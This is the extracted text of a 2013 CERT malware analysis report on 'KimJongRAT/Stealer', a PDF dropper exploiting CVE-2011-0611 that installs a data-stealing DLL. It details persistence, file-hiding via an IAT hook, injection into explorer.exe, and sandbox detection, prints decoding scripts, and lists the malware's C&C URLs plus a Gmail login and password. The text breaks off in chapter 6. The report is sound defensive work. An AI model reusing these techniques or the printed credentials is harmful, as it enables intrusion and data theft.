{
    "id": "a7ba9600-df39-40a3-9b4f-15632e558277",
    "created_at": "2022-10-25T16:48:15.515218Z",
    "updated_at": "2025-03-27T02:05:38.978217Z",
    "deleted_at": null,
    "sha1_hash": "736eda24a81b1b8102970d7398b19e519ddc4537",
    "title": "KimJongRAT/stealer",
    "authors": "",
    "file_creation_date": "2013-06-10T16:50:22Z",
    "file_modification_date": "2013-06-10T16:50:22Z",
    "file_size": 1633576,
    "plain_text": "#### Public document\n\n\n# KimJongRAT/stealer\n\n## malware analysis\n\n\n### General information\n\n\n###### Sequence number 003\n\n Version 1.0\n\n State Final\n\n Approved by Paul Rascagnères\n\n Approval date 10/06/2013\n\n Classification Public\n\n\n-----\n\n### History\n\n**Version** **Date** **Author** **Modifications**\n\n0.1 07/06/2013 P. Rascagnères Document creation\n\n0.2 08/06/2013 M. Morin Review and correction\n\n0.3 08/06/2013 P. Rascagnères Document update\n\n1.0 10/06/2013 P. Rascagnères Document finalisation\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 2 f 36\n\n|Version|Date|Author|Modifications|\n|---|---|---|---|\n|0.1|07/06/2013|P. Rascagnères|Document creation|\n|0.2|08/06/2013|M. Morin|Review and correction|\n|0.3|08/06/2013|P. Rascagnères|Document update|\n|1.0|10/06/2013|P. Rascagnères|Document finalisation|\n\n\n-----\n\n### Table of contents\n\n###### 1 Introduction ............................................................................................................................ 5\n**1.1** **Context .................................................................................................................................................... 5**\n**1.2** **Objectives ............................................................................................................................................... 5**\n**1.3** **Authors .................................................................................................................................................... 5**\n**1.4** **Document structure ............................................................................................................................... 6**\n###### 2 Analysis of the .pdf file .......................................................................................................... 7\n**2.1** **Description .............................................................................................................................................. 7**\n**2.2** **Analysis ................................................................................................................................................... 7**\n###### 3 Sysninit.ocx analysis ........................................................................................................... 10\n**3.1** **Description ............................................................................................................................................ 10**\n**3.2** **Function: ShellExploit ......................................................................................................................... 12**\n\n3.2.1 Persistence: resource manipulation ............................................................................................................... 12\n3.2.2 Persistence: file creation ................................................................................................................................ 13\n**3.3** **Function: PDFShow ............................................................................................................................. 15**\n**3.4** **Function: InitHidden ............................................................................................................................ 16**\n**3.5** **Function: InjectDLL .............................................................................................................................. 16**\n**3.6** **IAT Hook: zwQueryDirectoryFile .................................................................................................. 17**\n###### 4 Binary (.exe) launcher .......................................................................................................... 20\n**4.1** **Description ............................................................................................................................................ 20**\n**4.2** **Analysis ................................................................................................................................................. 20**\n\n4.2.1 Obfuscation .................................................................................................................................................... 21\n4.2.2 Injection of the .dll .......................................................................................................................................... 22\n4.2.3 VirtualBox detection ....................................................................................................................................... 24\n###### 5 C&C communication ............................................................................................................ 25\n**5.1** **Introduction .......................................................................................................................................... 25**\n**5.2** **First Command & Control ................................................................................................................... 25**\n**5.3** **Second Command & Control .............................................................................................................. 26**\n###### 6 Synthesis schema ................................................................................................................ 28\n**6.1** **Exploit and files deployment .............................................................................................................. 28**\n**6.2** **Starting of the malware ....................................................................................................................... 29**\n**6.3** **Communication to the Commands and Control ............................................................................... 30**\n###### 7 Conclusion ............................................................................................................................ 31 Appendix ...................................................................................................................................... 32\n\n**Exploit from stream 14 ................................................................................................................................ 32**\n**Shellcode from stream 14 ........................................................................................................................... 33**\n**Decrypt data ................................................................................................................................................. 34**\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 3 f 36\n\n\n-----\n\n### List of figures\n\n###### Figure 1: virustotal analysis ............................................................................................................. 5 Figure 2: Stream 14 JavaScript ....................................................................................................... 8 Figure 3: Call of the findResources function .................................................................................. 12 Figure 4: Values of the arguments of the findResources function .................................................. 12 Figure 5: Decrypted data of the resource STARTEXE ................................................................... 13 Figure 6: Random installation path and file name .......................................................................... 14 Figure 7: .lnk creation .................................................................................................................... 14 Figure 8: Decrypted data of the resource PDFDOC ....................................................................... 15 Figure 9: Real .pdf file shown to the user ...................................................................................... 16 Figure 10: Temporary .lis file ......................................................................................................... 17 Figure 11: Files hidden in the explorer but not in cmd.exe ............................................................. 18 Figure 12: ntdll.ZwQueryDirectoryFile hook ................................................................................... 18 Figure 13: Call of myNtQueryDirectoryFile .................................................................................... 19 Figure 14: the obfuscated function: loc_401740 in IDA Pro ........................................................... 21 Figure 15: the obfuscated function loc_401740 in OllyDBG ........................................................... 21 Figure 16: The real code of the function loc_401740 in OllyDBG ................................................... 22 Figure 17: Opening of the process explorer.exe ............................................................................ 22 Figure 18: Memory allocation in the process explorer.exe ............................................................. 23 Figure 19: Code copy in the process explorer.exe ......................................................................... 23 Figure 20: Execution of the function InjectDLL in the process explorer.exe ................................... 24 Figure 21: Gmail request creation ................................................................................................. 27 Figure 22: Exploit and files deployment schema ............................................................................ 28 Figure 23: malware starting schema .............................................................................................. 29 Figure 24: communication to the C&C schema .............................................................................. 30\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 4 f 36\n\n\n-----\n\n# 1 Introduction\n\n### 1.1 Context\n\n###### On the 8[th] of May 2013, a suspicious .pdf file was uploaded on malwr.com. The sandbox analysis is available here:\n\n https://malwr.com/analysis/MDZmNGQzOTM2OGRmNDhmMTlkOWYyMTlmNjI3YTkyODM/\n\n The file was scanned on virustotal and the results are available here:\n\n https://www.virustotal.com/en/file/41d7b66062825d41726bb243075f2a0d6d0c517bafcf63488a06c 5d009561df8/analysis/\n\n As of the 8[th] of May 2013, the detection ratio was 2/46:\n\nFigure 1: virustotal analysis\n\n###### We decided to perform an analysis of this sample which we named: KimJongRAT/Stealer.\n\n### 1.2 Objectives\n\n###### The objective of this report is to describe the exploit and the malware dropped by the .pdf file called “Draft response letter Slovenia.pdf”.\n\n### 1.3 Authors\n\n###### This report has been created by Malware.lu CERT, the first private Computer Security Incident Response Team (CSIRT) located in Luxembourg and itrust consulting S.A.R.L, a Luxembourg based company specialized in Information Security. \n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 5 f 36\n\n\n-----\n\n###### We would like to thank the incident response teams who have collaborated with us for their help and their support.\n\n### 1.4 Document structure\n\n###### This document is structured as follows:\n\n  Chapter 2 deals with the .pdf file;\n\n  Chapter 3 describes the file: Sysninit.ocx;\n\n  Chapter 4 describes the malware launcher (.exe file);\n\n  Chapter 5 presents the C&C communication;\n\n  Chapter 6 shows the working schema;\n\n  Chapter 7 provides a conclusion to the analysis.\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 6 f 36\n\n\n-----\n\n# 2 Analysis of the .pdf file\n\n### 2.1 Description\n\n###### Below is some information about the file:\n\n md5: 6a9598599055e4ed876ec699b0a91272 \n\n sha1: 2b47119b9c97b736c1c775f4fe62042481234730\n\n sha256: 41d7b66062825d41726bb243075f2a0d6d0c517bafcf63488a06c5d009561df8\n\n File type: PDF document, version 1.6\n\n Here is the metadata of the .pdf file:\n```\n   <rdf:Description rdf:about=\"\"\n      xmlns:dc=\"http://purl.org/dc/elements/1.1/\">\n     <dc:format>application/pdf</dc:format>\n     <dc:title>\n      <rdf:Alt>\n        <rdf:li xml:lang=\"x-default\">Microsoft Word - 1.doc</rdf:li>\n      </rdf:Alt>\n     </dc:title>\n     <dc:creator>\n      <rdf:Seq>\n        <rdf:li>Kim Song Chol</rdf:li>\n      </rdf:Seq>\n     </dc:creator>\n   </rdf:Description>\n\n### 2.2 Analysis\n\n###### The first step when dealing with a .pdf file is to look for the presence of JavaScript:\nrootbsd@malware.lu:~$ pdfextract -js file.pdf \nExtracted 5 PDF streams to 'file.dump/streams'.\nExtracted 1 scripts to 'file.dump/scripts'.\n\n Although the file contains a script, this script does not seem malicious:\nrootbsd@malware.lu:~$ cat file.dump/scripts/script_-230271738.js \nvar page=1;\nvar pdfver=app.viewerVersion;\nvar pdftype=app.viewerType;\nif(pdfver<\"10\")\n{\n  page=3;\n  if(pdftype==\"Reader\")\n  {\n    page=1;\n  }\n  if(pdfver<\"9\")\n  {\n    page=0;\n  }\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 7 f 36\n\n\n-----\n\n###### However, one of the streams is interesting:\n```\nrootbsd@malware.lu:~$ file file.dump/streams/stream_14.dmp \nfile.dump/streams/stream_14.dmp: Macromedia Flash data (compressed), version 9\n\n Stream 14 contains Macromedia Flash data which includes JavaScript:\n\n```\nFigure 2: Stream 14 JavaScript\n\n###### Thanks to a python script that we created, we were able to retrieve the exploit from the stream. The source code of this script can be found in the Appendix:\n```\npaul@malware.lu:~$ ./exploit_from_stream14.py\nrootbsd@alien:~/TODO$ md5sum exploit.swf \n60805b352c15413a9ceaabedc8f060ea exploit.swf\n\n We scanned this exploit on virustotal. The results can be found here:\n\n https://www.virustotal.com/en/file/1ecd67e8690a3f27d282246edc757040ba3eafcc310095bffa5cab 5bc4a60840/analysis/\n\n We discovered that the vulnerability used is not located in Acrobat Reader but in Flash Reader. Furthermore, we can see that the vulnerability is CVE-2011-0611.\n\n We then created another python script that extracted the shellcode in stream 14. The source code of this script is available in the Appendix:\nrootbsd@malware.lu:~ $ python shellcode_from_stream14.py \nrootbsd@malware.lu:~ $ file sc_.bin \nsc_.bin: DOS executable (COM)\n\n This shellcode decrypted data stored in the .pdf. The next step involved storing this data in a file called c:\\Document and Settings\\<user>\\Application Data\\sysninit.ocx.\n\n Below is the script to retrieve the sysninit.ocx file from the .pdf file:\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 8 f 36\n\n\n-----\n\n```\nrootbsd@malware.lu:~$ cat extract.py \n#!/usr/bin/env python\n# -*- coding: utf-8 -*import sys\nimport struct\nif __name__ == \"__main__\":\n  fp = open(sys.argv[1])\n  data = fp.read()\n  start_at = data.index(\"\\x53\\x27\\x27\\x53\") + 4 # magic start\n  end_at = data.index(\"\\x45\\x27\\x27\\x45\") # magic end\n  data = data[start_at+4:end_at]\n  out = []\n  headers = \"\"\n  for i in range(len(data)):\n    x = chr(ord(data[i])^0xaa)\n    out.append(x)\n    if i < 0xb:\n      headers += x\n  #data = fp.read()\n  for i in range(len(out) - 0xb):\n    x = chr(ord(out[i]) ^ ord(out[i+0x2]) ^ ord(out[i+0xb]))\n    out[i] = x\n  sys.stdout.write(headers + \"\".join(out))\nrootbsd@malware.lu:~$ ./extract.py file.pdf > extract.out \nrootbsd@malware.lu:~$ file extract.out \nextract.out: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n###### This sysninit.ocx file is the malware itself.\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 9 f 36\n\n\n-----\n\n# 3 Sysninit.ocx analysis\n\n### 3.1 Description\n\n###### Here is the information of the file:\n```\nMeta-data\n================================================================================\nFile:  extract.out\nSize:  348171 bytes\nType:  PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nMD5:   26eaac1501c62c470a1a9c615c4d7fb8\nSHA1:  d9313622210409c8ada3a6733b8b5560834e840f\nssdeep: 6144:cvhpdgZXXS75a8PxE71bpx/0iZC2XG+aBjMz/8/gmpuAI1+ZAJCJK:ipdgZXi75a2wj01jBQzMI1+6AK\nDate:  0x515F6CCE [Sat Apr 6 00:31:10 2013 UTC]\nEP:   0x1001510c .text 0/5\nCRC:   Claimed: 0x0, Actual: 0x5d5e2 [SUSPICIOUS]\nResource entries\n================================================================================\nName        RVA   Size   Lang     Sublang         Type\n-------------------------------------------------------------------------------PDFDOC       0x83560 0xcfb5  LANG_KOREAN SUBLANG_KOREAN      data\nSTARTEXE      0x75540 0xe020  LANG_KOREAN SUBLANG_KOREAN      data\nRT_CURSOR     0x908c8 0x134  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_CURSOR     0x90a00 0xb4   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_BITMAP     0x90ae0 0x5e4  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_BITMAP     0x911b0 0xb8   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_BITMAP     0x91268 0x16c  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_BITMAP     0x913d8 0x144  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_DIALOG     0x910c8 0xe8   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91520 0x6c   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91590 0x82   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91618 0x2a   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91648 0x14a  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91798 0x4e2  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x92010 0x2a2  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91d30 0x2dc  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x91c80 0xac   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x929e8 0xde   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x922b8 0x4c4  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x92780 0x264  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0x92ac8 0x2c   LANG_ENGLISH SUBLANG_ENGLISH_US    DBase \nRT_GROUP_CURSOR  0x90ab8 0x22   LANG_ENGLISH SUBLANG_ENGLISH_US    Lotus \nRT_VERSION     0x90518 0x3ac  LANG_ENGLISH SUBLANG_ENGLISH_US    data\nSuspicious IAT alerts\n================================================================================\nCreateProcessW\nCreateProcessA\nOpenProcess\nInternetReadFile\nHttpSendRequestExA\nHttpSendRequestA\nInternetConnectA\nSections\n================================================================================\nName    VirtAddr   VirtSize   RawSize   Entropy   \n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 10 f 36\n\n\n-----\n\n```\n-------------------------------------------------------------------------------.text   0x1000    0x25ca6   0x26000   6.623339  \n.rdata   0x27000   0x5926    0x6000    4.791280  \n.data   0x2d000   0x475a4   0x5000    3.104563  \n.rsrc   0x75000   0x1daf8   0x1e000   7.754305  [SUSPICIOUS]\n.reloc   0x93000   0x445c    0x5000    4.573944  \nVersion info\n================================================================================\nLegalCopyright: Copyright (C) 2012\nInternalName: sysninit\nFileVersion: 6.01.7601.17514\nCompanyName: Microsoft Corporation\nPrivateBuild: \nLegalTrademarks: \nComments: \nProductName: sysninit Dynamic Link Library\nSpecialBuild: \nProductVersion: 6.01.7601.17514\nFileDescription: Microsoft Windows Security\nOriginalFilename: sysninit.DLL\nTranslation: 0x0409 0x04b0\n\n###### We note the presence of two important resources:\n\n - PDFDOC\n - STARTEXE\n\n Here is the list of the exports available in the file:\nrootbsd@malware.lu:~ $ pe-export.py extract.out \n0x1000aec0 GetMyAPIInfo 1\n0x100089b0 HookProc 2\n0x1000d240 InitHidden 3\n0x1000b780 InjectDLL 4\n0x1000d6d0 PDFShow 5\n0x1000a540 SearchInfect 6\n0x1000d9c0 ShellExploit 7\n0x10011a60 ShellExploit_Exeinfect 8\n0x1000bec0 cHttpOpenRequestA 9\n0x1000bf00 cHttpSendRequestA 10\n0x1000bf50 cInternetCloseHandle 11\n0x1000bf30 cInternetReadFile 12\n0x1000bf60 cInternetWriteFile 13\n0x1000c760 cRegCloseKey 14\n0x1000c260 cRegEnumKeyA 15\n0x1000c300 cRegEnumKeyExA 16\n0x1000c450 cRegEnumKeyExW 17\n0x1000c3b0 cRegEnumKeyW 18\n0x1000c500 cRegEnumValueA 19\n0x1000c5b0 cRegEnumValueW 20\n0x1000c6c0 cRegOpenKeyA 21\n0x1000c660 cRegOpenKeyExW 22\n0x1000c710 cRegOpenKeyW 23\n0x1000bf80 cTranslateMessage 24\n0x10010d00 myNtQueryDirectoryFile 25\n\n As soon as the file is created by the shellcode, the function ShellExploit is executed.\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 11 f 36\n\n\n-----\n\n### 3.2 Function: ShellExploit\n\n###### The purpose of this function is to set the persistence of the malware. This function is only executed once by the Flash exploit. During the execution of this function, two other functions are launched PDFShow and InitHidden.\n\n##### 3.2.1 Persistence: resource manipulation\n\n###### During this task, the file sysninit.ocx is copied to popsys32.dll. We have not yet identified the reason for this.\n\n The resource called STARTEXE is read in raw and not with the classic Microsoft Resources API. To find the beginning of the resource, the malware looks for a specific string: ~!@#$%^&. The resources PDFDOC and STARTEXE start and end with this specific string. The function used to find the resources is sub_10005290:\n\nFigure 3: Call of the findResources function\n\nFigure 4: Values of the arguments of the findResources function\n\n###### The content of the resource is encrypted. The function used to decrypt the resource is sub_10006150. After the execution of the function, we are able to see the decrypted resource:\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 12 f 36\n\n\n-----\n\n###### Figure 5: Decrypted data of the resource STARTEXE\n\n As we expected, the content of the resource is an .exe file. The encryption algorithm is RC4. Here is the structure of the resources:\n```\n8 bytes # magic\n0x10 bytes # rc4 key\nn bytes # data\nn bytes # null byte to remove\n8 bytes # magic\n\n The script to extract and decrypt the resources is available in the Appendix:\n$ python decrypt.py sysninit.ocx\nwrite decoded file in file.dll.0.dec (PE32 executable (GUI) Intel 80386, for MS\nWindows)\nwrite decoded file in file.dll.1.dec (PDF document, version 1.4)\n\n##### 3.2.2 Persistence: file creation\n\n###### The .exe file is used for the persistence. The first step of the persistence is set by the function sub_1000E280; the second step is realised by the function sub_1000C790.\n\n Sub_1000E280\n\n The purpose of this function is to install malicious files on the system. The malware starts by choosing an installation path which is not always the same but always starts with c:\\Documents\nand Settings\\<user>\\Application Data. Here is an example of such a path:\nC:\\Documents and settings\\<user>\\Application Data\\adobe\\acrobat\\9.0\\\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 13 f 36\n\n\n-----\n\n###### The malware randomly generates a filename (the length of this filename is 8 characters without the extension). The malware copies the .exe file extracted from the resource with the extension .exe:\n\nFigure 6: Random installation path and file name\n\n###### Finally the malware copies itself (sysninit.ocx) in the same directory and with the same name but with the extension .dll.\n\n Sub_1000C790\n\n The purpose of this function is to start the malware during the startup of the system. To perform this task, the malware creates the file:\n```\nC:\\Documents and settings\\<user>\\Start Menu\\Programs\\Startup\\Adobe Acrobat\nSpeeding Launch.lnk\n\n Figure 7: .lnk creation\n\n This .lnk file executes the binary dropped in the previous function:\nrootbsd@malware.lu:~$ strings Adobe\\ Acrobat\\ Speeding\\ Launch.lnk \n settingocumentss\\rootbs\n/C:\\\nDOCUME~1\nrootbsd\nAPPLIC~1\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 14 f 36\n\n\n-----\n\n```\n@shell32.dll,-21765\nadobe\nacrobat\nxqpsjlbm.exe\nC:\\Documents and Settings\\rootbsd\\Application Data\\adobe\\acrobat\\xqpsjlbm.exe\nsandbox-283131a\n~ pA\n~ pA\n\n###### The next step of this function is to call PDFShow and InitHidden functions.\n\n### 3.3 Function: PDFShow\n\n###### The purpose of this function is to extract a .pdf file stored in the resource PDFDOC and display the .pdf to the user. The resource is encrypted like the resource STARTEXE:\n\n Figure 8: Decrypted data of the resource PDFDOC\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 15 f 36\n\n\n-----\n\n###### The .pdf file is copied in C:\\Documents and settings\\<user>\\Local settings\\Temp\\Draft\n```\nresponse letter Slovenia .pdf (with a space between the file name and the extension) and\n then, the reader is executed to display the real .pdf file to the user:\n\n```\nFigure 9: Real .pdf file shown to the user\n\n### 3.4 Function: InitHidden\n\n###### This function is executed only once by the Flash exploit. Thereafter, the malware will be run thanks to the binary extracted from the resource STARTEXE which uses the function InjectDLL.\n\n This function:\n\n - Sets the IAT hook explained in chapter 3.6;\n - Communicates to the Command and Control as explained in chapter 5.\n\n### 3.5 Function: InjectDLL\n\n###### This function is called by the binary stored in the resource STARTEXE. Chapter 4 will explain how the .dll, which contained InjectDLL, is injected in the process explorer.exe. InjectDLL is always executed in the explorer.exe process.\n\n It starts to steal and remove information contained in the browsers (Internet Explorer and Mozilla) cache (cookies, registry…). Afterwards, 4 threads are executed.\n\n The malware is able to ex-filtrate data and to look for specific files as:\n\n - .pps\n - .hwp\n - .exe\n - .jpg\n - .txt\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 16 f 36\n\n\n-----\n\n###### - .pdf\n - .doc\n - .docx\n - .xls\n - .xlsx\n - .ppt\n - .pptx\n - .zip\n - .rar\n\n The ex-filtrated data is explained in chapter 5. The malware also generates some temporary files:\n\nFigure 10: Temporary .lis file\n\n###### This function includes features such as code execution thanks to reflective dll loading. The function used to parse the .dll sent by the C&C is sub_10006720.\n\n The malware communicates to two kinds of C&C:\n\n - A website (www.jhj.wv4.org and www.test1.wv4.org);\n - A Gmail account.\n\n The network communication protocol is presented in chapter 5.\n\n### 3.6 IAT Hook: zwQueryDirectoryFile\n\n###### The malware sets up an IAT hook on the function ntdll.zwQueryDirectoryFile. The purpose of this hook is to hide every file dropped by the malware (file with an 8 random character filename) and the .ink file in “Start Menu”. The hook is only performed in the explorer.exe process. So it’s possible to display the file with cmd.exe:\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 17 f 36\n\n\n-----\n\nFigure 11: Files hidden in the explorer but not in cmd.exe\n\n###### In this screenshot, one can see that the address of ntdll.ZwQueryDirectoryFile is 0x7c90d76e and when we go to this address one can see call mfdffgce.00d2b080:\n\nFigure 12: ntdll.ZwQueryDirectoryFile hook\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 18 f 36\n\n\n-----\n\n###### The function sub_1000b080 calls myNtQueryDirectoryFile:\n\nFigure 13: Call of myNtQueryDirectoryFile\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 19 f 36\n\n\n-----\n\n# 4 Binary (.exe) launcher\n\n### 4.1 Description\n\n###### Here is the information of the file:\n```\nMeta-data\n================================================================================\nFile:  vxkvmgiq.exe\nSize:  57344 bytes\nType:  PE32 executable (GUI) Intel 80386, for MS Windows\nMD5:   86964f449a82b8485feef8a5339d0615\nSHA1:  848d0c4c4f608fdd50735a2f0c41af9abd5955a6\nssdeep: 768:FT/5b8yXryLkTNG9bQE7nXHYpkXwHHgGjnrkEjqGTQfNq8aruz/hVo:Fj/XzE7X4pkX0HXvWG0lTo\nDate:  0x515EE19E [Fri Apr 5 14:37:18 2013 UTC]\nEP:   0x402b52 .text 0/4\nCRC:   Claimed: 0x0, Actual: 0x14944 [SUSPICIOUS]\nResource entries\n================================================================================\nName        RVA   Size   Lang     Sublang         Type\n-------------------------------------------------------------------------------RT_ICON      0xf220  0x128  LANG_ENGLISH SUBLANG_ENGLISH_US   \nGLS_BINARY_LSB_FIRST\nRT_ICON      0xf360  0x128  LANG_ENGLISH SUBLANG_ENGLISH_US   \nGLS_BINARY_LSB_FIRST\nRT_MENU      0xf4a0  0x4a   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_DIALOG     0xf500  0xee   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_STRING     0xf5f0  0x54   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_ACCELERATOR   0xf4f0  0x10   LANG_ENGLISH SUBLANG_ENGLISH_US    data\nRT_GROUP_ICON   0xf348  0x14   LANG_ENGLISH SUBLANG_ENGLISH_US    MS Wi\nRT_GROUP_ICON   0xf488  0x14   LANG_ENGLISH SUBLANG_ENGLISH_US    MS Wi\nSuspicious IAT alerts\n================================================================================\nOpenProcess\nCreateRemoteThread\nWriteProcessMemory\nVirtualAllocEx\nReadProcessMemory\nOpenProcessToken\nSections\n================================================================================\nName    VirtAddr   VirtSize   RawSize   Entropy   \n-------------------------------------------------------------------------------.text   0x1000    0x9485    0xa000    6.394957  \n.rdata   0xb000    0xf0a    0x1000    5.255918  \n.data   0xc000    0x249c    0x1000    1.991382  \n.rsrc   0xf000    0x648    0x1000    1.434261  \n\n### 4.2 Analysis\n\n###### The purpose of this binary is to inject the .dll file in the process explorer.exe and execute the function InjectDLL.\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 20 f 36\n\n\n-----\n\n##### 4.2.1 Obfuscation\n\n###### The most important function is loc_401740, but this function is obfuscated:\n\nFigure 14: the obfuscated function: loc_401740 in IDA Pro\n\n###### We can set a breakpoint on OllyDBG to see the real function:\n\nFigure 15: the obfuscated function loc_401740 in OllyDBG\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 21 f 36\n\n\n-----\n\n###### To get the code, we need to do “Analyse Code” (or Crtl+A):\n\nFigure 16: The real code of the function loc_401740 in OllyDBG\n\n##### 4.2.2 Injection of the .dll\n\n###### The function loc_401740 is used to inject the .dll file in the process explorer.exe. The first step is to find the PID of the process explorer.exe. Once the PID is found, the malware uses the function OpenProcess():\n\nFigure 17: Opening of the process explorer.exe\n\n###### The next step is to allocate memory in the process explorer.exe:\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 22 f 36\n\n\n-----\n\nFigure 18: Memory allocation in the process explorer.exe\n\n###### Once the memory is allocated, the code is written in the process explorer.exe with the function WriteProcessMemory:\n\nFigure 19: Code copy in the process explorer.exe\n\n###### Eventually the code is executed in the process explorer.exe and the function InjectDLL is executed:\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 23 f 36\n\n\n-----\n\nFigure 20: Execution of the function InjectDLL in the process explorer.exe\n\n##### 4.2.3 VirtualBox detection\n\n###### The malware detects if it is running on VirtualBox. To detect that, the malware checks if a process VBoxTray.exe is running on the system. If so, an .ini file is created containing the word VBOXTRAY.EXE. The .ini file is encrypted in the same manner as the resources:\n```\n$ python decrypt.py -d mppwvzsi.ini\nwrite decoded file in mppwvzsi.ini.dec (VBOX voice message data)\n$ cat mppwvzsi.ini.dec\nVBOXTRAY.EXE\n\n Also, if the process is running, the malware injects the same .dll in the process VBoxTray.exe.\n\n We did not analyse if the malware performed specific actions during this process.\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 24 f 36\n\n\n-----\n\n# 5 C&C communication\n\n### 5.1 Introduction\n\n###### The malware communicates to two Command and Control:\n\n - A web site (www.jhj.wv4.org and www.test1.wv4.org)\n - A Gmail account\n\n The configuration of the C&C is located at the end of the .dll file. The data is encrypted in the same manner as the resources: rootbsd@malware.lu:~$ python decrypt.py -c sysninit.ocx \n```\nhttp://www.jhj.wv4.org/test1/\nhttp://www.jhj.wv4.org/test2/\nhttp://www.test1.wv4.org/\nlaoshi135.zhang\nasdasd123456789\nrrntareo@gmail.com\n\n The Gmail account is only used if the first C&C does not reply, particularly if the page serverok.html does not reply “Server is OK.”.\n\n### 5.2 First Command & Control\n\n###### To communicate on the Internet, the malware uses the WinHTTP Windows API. This API allows the malware to transparently use proxy credentials of the user (if a proxy is used).\n\n The first request performed is to http://www.jhj.wv4.org/test2/serverok.html. The purpose of the request is to verify if the command and control is up. If the server does not reply, the malware uses the second command & control.\n\n The second request is performed to http://www.jhj.wv4.org/test2/serverok.html. This page is in fact a .php file. The script waits for two POST variables:\n\n - Subject\n - Data\n\n These variables contain the ex-filtrated data.\n\n The Subject variable contains the hostname, encoded in base64, of the infected machine followed by _ini_done, _list_done or _que_done.\n\n The Data variable contains the ex-filtrated data. The algorithm is closed to the encryption of the resources. The data is stored in base64 and the “+” is replaced by “.”. Here are some examples of data: \nrootbsd@malware.lu:~$ python decrypt.py -b POST_data.raw\nC:\\Documents and Settings\\sandbox\\Desktop\\sample.pdf\nThis computer's IP Address is 10.0.2.15\nThis computer's name is sandbox\nThis computer's username is rootbsd\nDrive Information is as follow\nc:\\( NTFS) DRIVE_FIXED\nd:\\( NTFS) DRIVE_CDROM\ne:\\(VBOX_Tools VBoxSharedFolderFS) DRIVE_REMOTE\nOS: Microsoft Windows XP Service Pack 3\nWeb Browser List\niexplore.exe\nIE Version 6.0.2900.5512\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 25 f 36\n\n\n-----\n\n```\nhttp://www.google.com/\nhttp://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=msnhome\nInstalled,Often used,or Other Programs List\nacrord32.exe\nbckgzm.exe\nchkrzm.exe\ncmmgr32.exe\nconf.exe\ndialer.exe\nhelpctr.exe\nhrtzzm.exe\nhypertrm.exe\nicwconn1.exe\nicwconn2.exe\niexplore.exe\ninetwiz.exe\ninstall.exe\nisignup.exe\nmigwiz.exe\nmoviemk.exe\nmplayer2.exe\nmsconfig.exe\nmsimn.exe\nmsinfo32.exe\nmsmsgs.exe\npbrush.exe\npinball.exe\nrvsezm.exe\nsetup.exe\nshvlzm.exe\ntable30.exe\nwab.exe\nwabmig.exe\nwinnt32.exe\nwmplayer.exe\nwordpad.exe\nwrite.exe\nlangid\nWebFldrs XP\nAdobe Reader 9.4.0\nRecent opened File List\nC:\\Documents and Settings\\rootbsd\\Desktop\\sample.pdf\n\n###### The malware could download a file with a .que extension. This file contains the code to execute on the infected machine. The function used to parse the decrypted .que file sent by the C&C is sub_10006720.\n\n### 5.3 Second Command & Control\n\n###### The second command & control is a Gmail account. This C&C seems to be a backup C&C. Here is the creation of the Gmail request:\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 26 f 36\n\n\n-----\n\nFigure 21: Gmail request creation\n\n###### The Gmail account is laoshi135.zhang and the password: asdasd123456789. When we tried to log on the Gmail account a secret question in Korean was asked. This part on the malware seems to not working; the malware always stopped on the secret question… We assume that the malware sends an email to rrntareo@gmail.com. But we never saw a successful connection.\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 27 f 36\n\n\n-----\n\n# 6 Synthesis schema\n\n### 6.1 Exploit and files 